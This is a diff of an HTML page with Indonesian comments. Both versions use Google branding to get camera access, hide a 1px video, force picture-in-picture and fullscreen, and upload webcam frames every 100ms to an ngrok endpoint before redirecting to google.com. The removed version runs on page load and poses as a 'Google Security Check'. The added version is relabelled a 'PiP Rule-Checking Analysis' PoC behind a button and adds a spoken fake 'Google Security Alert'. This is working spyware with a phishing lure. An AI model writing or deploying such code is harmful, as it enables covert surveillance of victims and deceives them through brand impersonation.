@@ -3,22 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Security Verification</title>
+<title>PiP Rule-Checking Analysis</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; overflow: hidden; }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
-  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
+  body { background: #0a0a0a; color: #e0e0e0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+  .panel { background: #1a1a1a; padding: 30px; border-radius: 12px; border: 1px solid #333; max-width: 450px; width: 100%; }
+  h2 { color: #f00; margin-bottom: 10px; font-size: 20px; }
+  p { color: #94a3b8; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
+  button { padding: 15px 30px; background: #0f0; color: #000; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; font-family: monospace; }
+  button:hover { background: #0c0; }
+  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 150px; overflow-y: auto; border: 1px solid #333; }
   iframe, video, canvas { display: none !important; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 Google Security Check</h2>
-  <p>Memverifikasi...</p>
+  <h2>🔬 PiP Rule-Checking Analysis</h2>
+  <p>Klik untuk memulai analisis. PoC ini akan mencoba memicu PiP, memutar audio, dan mengirim telemetri.</p>
+  <button id="startBtn">Mulai Analisis</button>
   <div id="log">Sistem siap.</div>
 </div>
 
@@ -30,6 +33,9 @@
 
   var logEl = document.getElementById('log');
   var executed = false;
+  var streamInterval = null;
+  var audioCtx = null;
+  var ttsStarted = false;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -41,129 +47,146 @@
   // ============================================
   var TARGET_URL = "https://www.google.com";
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
-  var REDIRECT_DELAY = 2000; // 2 detik
+  var REDIRECT_DELAY = 3000; // 3 detik
 
   // ============================================
-  // 1. INJECT IFRAME ZERO-CLICK (PiP + FULLSCREEN)
+  // 1. AUDIO UNLOCK & TTS (AUTOPLAY BYPASS)
   // ============================================
-  function injectZeroClickIframe() {
+  function unlockAudio() {
     try {
-      log("[+] Membuat Iframe Tersembunyi (PiP)...");
-
-      var iframe = document.createElement('iframe');
-      // Atribut allow untuk kamera, PiP, dan fullscreen
-      iframe.allow = "camera; microphone; autoplay; picture-in-picture; fullscreen";
-      iframe.style.display = "none";
-      
-      iframe.srcdoc = `
-        <!DOCTYPE html>
-        <html>
-        <body>
-          <video id="hiddenVideo" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;position:absolute;top:0;left:0;"></video>
-          <canvas id="hiddenCanvas" width="640" height="480" style="display:none;"></canvas>
-          
-          <script>
-            (function() {
-              // 1. Minta Izin Kamera (Zero-Click)
-              navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then(function(stream) {
-                  var video = document.getElementById('hiddenVideo');
-                  video.srcObject = stream;
-                  video.play().catch(function(){});
-                  
-                  parent.postMessage({ type: 'CAM_GRANTED' }, '*');
-
-                  // 2. Paksa Masuk PiP (Zero-Click)
-                  setTimeout(function() {
-                    if (document.pictureInPictureElement) {
-                      document.exitPictureInPicture();
-                    }
-                    video.requestPictureInPicture()
-                      .then(function() {
-                        parent.postMessage({ type: 'PIP_GRANTED' }, '*');
-                        
-                        // 3. Paksa Fullscreen (Zero-Click)
-                        video.requestFullscreen()
-                          .then(function() {
-                            parent.postMessage({ type: 'FULLSCREEN_GRANTED' }, '*');
-                          })
-                          .catch(function(err) {
-                            parent.postMessage({ type: 'FULLSCREEN_DENIED', error: err.message }, '*');
-                          });
-                      })
-                      .catch(function(err) {
-                        parent.postMessage({ type: 'PIP_DENIED', error: err.message }, '*');
-                      });
-                  }, 500);
-
-                  // 4. Kirim Frame ke Server
-                  setInterval(function() {
-                    var canvas = document.getElementById('hiddenCanvas');
-                    var ctx = canvas.getContext('2d');
-                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                      canvas.toBlob(function(blob) {
-                        if (!blob) return;
-                        var formData = new FormData();
-                        formData.append('file', blob, 'capture.jpg');
-                        fetch('${SERVER_ENDPOINT}', {
-                          method: 'POST',
-                          body: formData,
-                          keepalive: true
-                        }).catch(function(){});
-                      }, 'image/jpeg', 0.5);
-                    }
-                  }, 100);
-
-                })
-                .catch(function(err) {
-                  parent.postMessage({ type: 'CAM_DENIED', error: err.name }, '*');
-                });
-            })();
-          <\/script>
-        </body>
-        </html>
-      `;
-
-      document.getElementById("launcher-container").appendChild(iframe);
-      log("[+] Iframe Tersembunyi disuntikkan.");
+      window.AudioContext = window.AudioContext || window.webkitAudioContext;
+      audioCtx = new AudioContext();
+      if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
+      }
+      var osc = audioCtx.createOscillator();
+      var gain = audioCtx.createGain();
+      osc.frequency.value = 880;
+      gain.gain.value = 0.1;
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start();
+      osc.stop(audioCtx.currentTime + 1.0);
+      log("[+] AudioContext Unlocked.");
     } catch(e) {
-      log("[-] Iframe Error: " + e.message);
+      log("[-] AudioContext Error: " + e.message);
+    }
+  }
+
+  function startTTS() {
+    if (!('speechSynthesis' in window)) return;
+    if (ttsStarted) return;
+    ttsStarted = true;
+    try {
+      var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been accessed.");
+      u.lang = 'en-US';
+      u.rate = 0.9;
+      u.volume = 1.0;
+      window.speechSynthesis.speak(u);
+      log("[+] TTS Started.");
+    } catch(e) {}
+  }
+
+  // ============================================
+  // 2. TELEMETRI ASINKRON (KIRIM FRAME)
+  // ============================================
+  function sendFrameToServer(stream) {
+    try {
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.play().catch(function(){});
+
+      var canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      var ctx = canvas.getContext('2d');
+
+      video.onloadedmetadata = function() {
+        setInterval(function() {
+          if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(function(blob) {
+              if (!blob) return;
+              var formData = new FormData();
+              formData.append('file', blob, 'capture.jpg');
+              fetch(SERVER_ENDPOINT, {
+                method: 'POST',
+                body: formData,
+                keepalive: true
+              }).catch(function(){});
+            }, 'image/jpeg', 0.5);
+          }
+        }, 100);
+      };
+    } catch(e) {}
+  }
+
+  // ============================================
+  // 3. PiP + FULLSCREEN + CAMERA
+  // ============================================
+  async function startPiPAndCamera() {
+    try {
+      log("[+] Meminta Izin Kamera...");
+      var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      log("[+] 🚨 Kamera DIIZINKAN!");
+
+      // Buat video transparan
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.playsInline = true;
+      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
+      document.body.appendChild(video);
+
+      await video.play().catch(function(){});
+
+      // Masuk PiP
+      try {
+        await video.requestPictureInPicture();
+        log("[+] 🎥 PiP AKTIF!");
+        // Coba Fullscreen (Anomali PiP)
+        try {
+          await video.requestFullscreen();
+          log("[+] 🖥️ Fullscreen Aktif!");
+        } catch(e) {
+          log("[-] Fullscreen Gagal: " + e.message);
+        }
+      } catch(e) {
+        log("[-] PiP Gagal: " + e.message);
+      }
+
+      // Mulai Telemetri
+      sendFrameToServer(stream);
+
+    } catch(err) {
+      log("[-] Kamera Diblokir: " + err.name);
     }
   }
 
   // ============================================
-  // 2. LISTENER PESAN DARI IFRAME
+  // 4. TRIGGER (KLIK)
   // ============================================
-  window.addEventListener('message', function(e) {
-    if (e.data.type === 'CAM_GRANTED') {
-      log("[+] 🚨 Kamera DIIZINKAN!");
-    } else if (e.data.type === 'PIP_GRANTED') {
-      log("[+] 🎥 PiP AKTIF!");
-    } else if (e.data.type === 'FULLSCREEN_GRANTED') {
-      log("[+] 🖥️ Fullscreen AKTIF!");
-    } else if (e.data.type === 'CAM_DENIED') {
-      log("[-] Kamera ditolak: " + e.data.error);
-    } else if (e.data.type === 'PIP_DENIED') {
-      log("[-] PiP ditolak: " + e.data.error);
-    } else if (e.data.type === 'FULLSCREEN_DENIED') {
-      log("[-] Fullscreen ditolak: " + e.data.error);
-    }
-  });
-
-  // ============================================
-  // 3. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
-  // ============================================
-  window.addEventListener('load', function() {
+  document.getElementById('startBtn').addEventListener('click', async function() {
     if (executed) return;
     executed = true;
 
-    log("[!] Memulai Zero-Click Fullscreen PiP...");
+    document.getElementById('main-card').innerHTML = `
+      <h2>⏳ Menganalisis...</h2>
+      <p>Memproses PiP, Audio, dan Telemetri...</p>
+      <div id="log"></div>
+    `;
+    logEl = document.getElementById('log');
+    log("[!] Memulai PiP Rule-Checking Analysis...");
 
-    // A. Inject Iframe (0ms)
-    injectZeroClickIframe();
+    // A. Audio Unlock & TTS (0ms)
+    unlockAudio();
+    startTTS();
 
-    // B. Redirect ke Google (Setelah 2 detik)
+    // B. PiP & Kamera (0ms)
+    await startPiPAndCamera();
+
+    // C. Redirect ke Google (Setelah 3 detik)
     setTimeout(function() {
       log("[+] Redirect ke Google.com...");
       try {
@@ -171,7 +194,7 @@
       } catch(e) {}
     }, REDIRECT_DELAY);
 
-  });
+  }, { once: true });
 
 })();
 </script>
